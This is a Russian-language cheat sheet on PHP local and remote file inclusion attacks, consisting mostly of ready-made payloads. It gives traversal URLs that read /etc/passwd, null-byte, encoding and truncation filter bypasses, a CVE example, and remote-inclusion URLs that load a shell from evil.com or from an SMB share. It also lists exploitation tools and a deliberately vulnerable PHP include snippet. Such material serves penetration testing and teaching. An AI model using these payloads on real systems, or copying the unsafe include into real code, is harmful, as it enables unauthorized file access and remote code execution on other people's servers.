* [Инструменты](#Инструменты)
* [Локальное включение файлов (LFI)](#Локальное-включение-файлов-LFI)
    * [Null Byte](#Null-Byte)
    * [Двойное кодирование](#Двойное-кодирование)
    * [UTF-8 кодирование](#UTF-8-кодирование)
    * [Усечение пути](#Усечение-пути)
    * [Обход фильтров](#Обход-фильтров)
* [Удаленное включение файлов (RFI)](#Удаленное-включение-файлов-RFI)
    * [Null Byte RFI](#Null-Byte-RFI)
    * [Двойное кодирование RFI](#Двойное-кодирование-RFI)
    * [Обход allow_url_include](#Обход-allow_url_include) 
* [URL](#URL)


> Уязвимость включения файлов - это тип уязвимости безопасности в веб-приложениях, особенно распространенный в приложениях, разработанных на PHP, где можно включить файл, используя недостаточную проверку входных/выходных данных.
>> Эта уязвимость может привести к различным вредоносным действиям, включая выполнение кода, кражу данных и изменение содержимого веб-сайта.


# Инструменты

* [P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus) (архивирован 7 октября 2020) - kadimus это инструмент для проверки и эксплуатации уязвимостей LFI
* [D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite) - Полностью автоматический эксплойтер LFI (+ Reverse Shell) и сканер
* [kurobeats/fimap](https://github.com/kurobeats/fimap) - fimap это небольшой python инструмент, который может находить, подготавливать, аудитить, эксплуатировать и даже автоматически искать через Google уязвимости включения локальных и удаленных файлов в веб-приложениях
* [lightos/Panoptic](https://github.com/lightos/Panoptic) - Panoptic это инструмент тестирования на проникновение с открытым исходным кодом, который автоматизирует процесс поиска и извлечения содержимого общих лог- и конфигурационных файлов через уязвимости обхода путей
* [hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap) - Инструмент для обнаружения и эксплуатации уязвимостей локального включения файлов

# Локальное включение файлов (LFI)

> Уязвимость включения файлов следует отличать от обхода путей (**Path Traversal**). Уязвимость обхода путей позволяет получить доступ к файлу, обычно используя механизм "чтения", реализованный в целевом приложении, тогда как включение файлов приведет к выполнению произвольного кода.

PHP скрипт включает файл на основе пользовательского ввода. Если надлежащая проверка не реализована, можно манипулировать параметром page для включения локальных или удаленных файлов, что приведет к несанкционированному доступу или выполнению кода.

```php
<?php
$file = $_GET['page'];
include($file);
?>
```

В следующих примерах включаем файл /etc/passwd, проверь главу [Directory & Path Traversal](https://github.com/Kaupervud69/WebVuln/blob/main/Path%20traversal/README.md) для более интересных файлов.

```http
http://example.com/index.php?page=../../../etc/passwd
```

# Null Byte

⚠️ В версиях PHP ниже 5.3.4 мы можем завершать null байтом (%00).

```
http://example.com/index.php?page=../../../etc/passwd%00
```

**Пример:** Joomla! Component Web TV 1.0 - CVE-2010-1470

```
{{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00
```

# Двойное кодирование

```
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

# UTF-8 кодирование

```
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

# Усечение пути

В большинстве установок PHP имя файла длиннее 4096 байт будет обрезано, поэтому любые лишние символы будут отброшены.

```
http://example.com/index.php?page=../../../etc/passwd............[ДОБАВЬ БОЛЬШЕ]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ДОБАВЬ БОЛЬШЕ]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ДОБАВЬ БОЛЬШЕ] 
http://example.com/index.php?page=../../../[ДОБАВЬ БОЛЬШЕ]../../../../etc/passwd
```

# Обход фильтров

```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

# Удаленное включение файлов (RFI)

> Удаленное включение файлов (RFI) - это тип уязвимости, который возникает, когда приложение включает удаленный файл, обычно через пользовательский ввод, без надлежащей проверки или санитизации входных данных.

Удаленное включение файлов больше не работает в конфигурации по умолчанию, поскольку allow_url_include отключен начиная с PHP 5.

```
allow_url_include = On
```

* Большинство методов обхода фильтров из раздела LFI можно повторно использовать для RFI.

```
http://example.com/index.php?page=http://evil.com/shell.txt
```

# Null Byte RFI

```
http://example.com/index.php?page=http://evil.com/shell.txt%00
```

# Двойное кодирование RFI

```
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

# Обход allow_url_include

* Когда allow_url_include и allow_url_fopen установлены в Off. Все еще возможно включить удаленный файл на Windows машине с использованием протокола smb.

1. Создай общедоступную общую папку
2. Напиши PHP код внутри файла: shell.php
3. Включи его: ```http://example.com/index.php?page=\\10.0.0.1\share\shell.php```

# URL

* [CVV #1: Local File Inclusion - SI9INT - 20 июня 2018](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
* [Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction - Mannu Linux - 12 мая 2019](https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
* [LFI Cheat Sheet - @Arr0way - 24 апреля 2016](https://highon.coffee/blog/lfi-cheat-sheet/)

   
